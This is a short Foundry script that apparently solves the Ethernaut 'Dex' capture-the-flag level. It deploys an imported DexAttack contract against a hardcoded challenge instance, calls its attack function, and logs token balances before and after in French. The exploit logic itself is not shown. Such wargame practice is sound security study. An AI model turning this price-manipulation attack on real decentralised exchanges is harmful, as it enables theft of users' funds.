// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/DexAttack.sol"; // 1) add file

contract SolveDex is Script { // 2) change contractName

    function run() external {

        address target = 0x6d83669068569345D4b4850619ca749032426a90; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        DexAttack attacker = new DexAttack(target);

        console.log("La balance 1 de user est ", IDex(target).balanceOf(IDex(target).token1(), vm.addr(privateKey)));
        console.log("La balance 2 de user est ", IDex(target).balanceOf(IDex(target).token2(), vm.addr(privateKey)));


        attacker.attack();

        console.log("La balance 1 de user est ", IDex(target).balanceOf(IDex(target).token1(), vm.addr(privateKey)));
        console.log("La balance 2 de user est ", IDex(target).balanceOf(IDex(target).token2(), vm.addr(privateKey)));



        vm.stopBroadcast();

    }
}